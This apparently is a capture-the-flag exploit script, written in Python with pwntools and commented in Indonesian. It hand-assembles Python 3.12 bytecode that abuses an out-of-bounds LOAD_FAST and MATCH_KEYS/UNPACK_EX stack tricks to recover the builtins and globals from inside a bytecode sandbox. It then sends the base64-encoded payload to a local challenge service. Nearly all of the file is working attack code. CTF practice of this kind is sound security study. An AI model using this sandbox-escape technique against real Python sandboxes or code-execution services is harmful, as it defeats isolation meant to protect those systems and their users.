from pwn import *
from dis import dis, _all_opmap as opmap
# https://docs.python.org/3.12/library/dis.html#python-bytecode-instructions
# Ini ada OOB di LOAD_FAST cuma dia beda tiap program?????
# Kalo di challenge file dia ada di index 42 ('*')
BUILTINS_INDEX = 42
LOAD_FAST = opmap['LOAD_FAST']
LOAD_GLOBAL = opmap['LOAD_GLOBAL']
RETURN_VALUE = opmap['RETURN_VALUE']
DELETE_SUBSCR = opmap['DELETE_SUBSCR']
STORE_FAST = opmap['STORE_FAST']
BUILD_MAP = opmap['BUILD_MAP']
LAE = opmap['LOAD_ASSERTION_ERROR']
FOR_ITER = opmap['FOR_ITER']
GET_ITER = opmap['GET_ITER']
LOAD_CONST = 100
CALL_NO_KW_STR_1 = opmap['CALL_NO_KW_STR_1']
SWAP = opmap['SWAP']
UNPACK_EX = opmap['UNPACK_EX']
MATCH_KEYS = opmap['MATCH_KEYS']
UNPACK_EX2 = b'^x'               # UNPACK_EX atau star (*x) basically *x trus unpacked valuesnya ada 120 ord('x')
SWAP_STACK = b'cy'              # Swap stack[-121] dengan TOS
POP = b'#;Y;Y;'                 # POP
BUILD_TUPLE2 = b'fx'             # Make a 120 sized tuple
BUILD_TUPLE = opmap['BUILD_TUPLE']
DUMP_TO_STACK = b'!;^x'         # MATCH_KEYS -> UNPACK_EX (sekarang 120 values builtin ada di stack)
CALL_NO_KW_BUILTIN_FAST = opmap['CALL_NO_KW_BUILTIN_FAST']
STORE_SUBSCR = opmap['STORE_SUBSCR']
LOAD_GLOBAL_BUILTIN = opmap['LOAD_GLOBAL_BUILTIN']
COPY = opmap['COPY']
context.log_level = 'critical'


CNT = 43
CNT2 = 20
code = bytes([
    # Recover builtins
    COPY, 5,
    COPY, 6,
    UNPACK_EX, CNT,
    SWAP, CNT+1,
    *POP,
    BUILD_TUPLE, CNT,
    MATCH_KEYS, CNT,
    UNPACK_EX, 2,
    SWAP, 2,                          # print function
    # Recover globals
    COPY, 11,
    COPY, 12,
    UNPACK_EX, CNT2,
    SWAP, CNT2+1,
    *POP,
    BUILD_TUPLE, CNT2,
    MATCH_KEYS, CNT2,
    UNPACK_EX, 2,
    SWAP, 2,
    COPY, 2,
    COPY, 7,                        # print()
    COPY, 3,                        # code
    CALL_NO_KW_BUILTIN_FAST, 0,     # print(code)
    2,2,2,2,2,9,                    # cache and also to make it divisible by 17
    RETURN_VALUE, 0,
])




print([x for x in code])
print(len(code))
print(sum([x for x in code]) % 17)

from base64 import b64encode

p = remote("localhost", 1225)
b64code = b64encode(code)

# payload = open('payload', 'w')
# payload.write(b64code.decode())
# payload.close()

p.sendline(b64code)
p.interactive()
